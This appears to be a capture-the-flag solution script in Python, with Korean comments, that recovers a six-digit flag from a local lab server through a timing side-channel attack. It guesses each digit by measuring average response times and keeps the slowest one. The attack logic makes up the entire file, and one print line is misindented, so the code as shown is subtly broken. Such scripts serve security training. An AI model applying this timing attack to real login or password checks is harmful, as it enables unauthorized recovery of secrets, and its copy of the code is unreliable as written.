import time
from socket import *
#localhost my ip
IP = "172.30.1.80"
PORT = 3333

Password = ""
mytime = 0

s = socket()
s.connect((IP, PORT))
s.send("1\n".encode("utf-8"))
s.recv(100)
s.close()

for i in range(6):
    avg_times = {}  # 각 숫자의 응답 시간을 기록할 딕셔너리 초기화

    for x in range(0x30, 0x3A):  # ASCII 코드 값 0x30 ~ 0x39 (숫자 0부터 9까지)
        s = socket()
        s.connect((IP, PORT))
        testStr = "HCAMP{" + Password + chr(x)
        s.recv(100)

        # 여러 번의 시도로 평균 응답 시간 계산
        num_attempts = 5
        total_time = 0
        for _ in range(num_attempts):
            stime = time.time()
            s.send(testStr.encode("utf-8"))
            response = s.recv(100)
            taketime = time.time() - stime
            total_time += taketime
        avg_time = total_time / num_attempts
				print('\n')
        print(f"Tested: {testStr}, Average Time: {avg_time}")

        avg_times[x] = avg_time
        s.close()

    # 가장 오래 걸린 숫자 찾기
    max_time_char = max(avg_times, key=avg_times.get)

    # 가장 오래 걸린 숫자를 비밀번호에 추가
    Password += chr(max_time_char)

print(f"\nFinal Password: HCAMP{{{Password}}}")
#https://bpsecblog.wordpress.com/2016/10/07/oldschool_timeattack/https://drive.google.com/drive/folders/19Ye8-AqKCI2cjUBYNrN71SJT9zQrkV9M?usp=drive_link
#docker 명령어 : sudo docker-compose up -d
#FLAG 포맷 HCAMP{ }
#FLAG는 6자리 숫자
#정답의 경우 ‘docker-time1sgold.zip’ 내부 server 파일에 있음 단, 코드를 작성하여 해당 패스워드를 알아내야만 함
